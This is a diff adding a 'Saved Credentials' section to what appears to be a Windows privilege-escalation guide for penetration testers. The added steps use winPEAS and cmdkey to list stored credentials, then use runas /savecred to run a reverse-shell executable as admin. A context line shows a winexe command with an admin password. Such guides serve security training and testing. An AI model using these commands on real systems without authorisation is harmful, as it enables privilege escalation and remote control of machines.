@@ -698,6 +698,29 @@ Because this frequently yields a large number of results, it is often better to 
    winexe -U 'admin%r4nd0mp44ss' //192.168.1.22 cmd.exe
    ```
 
+### Saved Credentials
+
+The runas command in Windows allows users to execute commands with the permissions of other users. This normally necessitates knowing the password of the other user. Users can save their credentials to the system in Windows, and these saved credentials can be exploited to get around this requirement.
+
+#### Saved Credentials Privilege Escalation
+
+1. You can check for saved credentials with winPEAS:
+
+   ```text
+   > .\winPEASany.exe quiet cmd windowscreds
+   ```
+
+2. Using the following command, we can manually verify this:
+
+   ```text
+   > cmdkey /list
+   ```
+
+3. As the admin user, we may utilize the saved credentials to run any command. On your host \(e.g Kali or Parrot\), start a listener and execute the reverse shell executable:
+4. ```text
+   > runas /savecred /user:admin C:\PrivEsc\reverse.exe
+   ```
+
 ### SSH Keys in Registry
 
 ### Passwords in Memory 
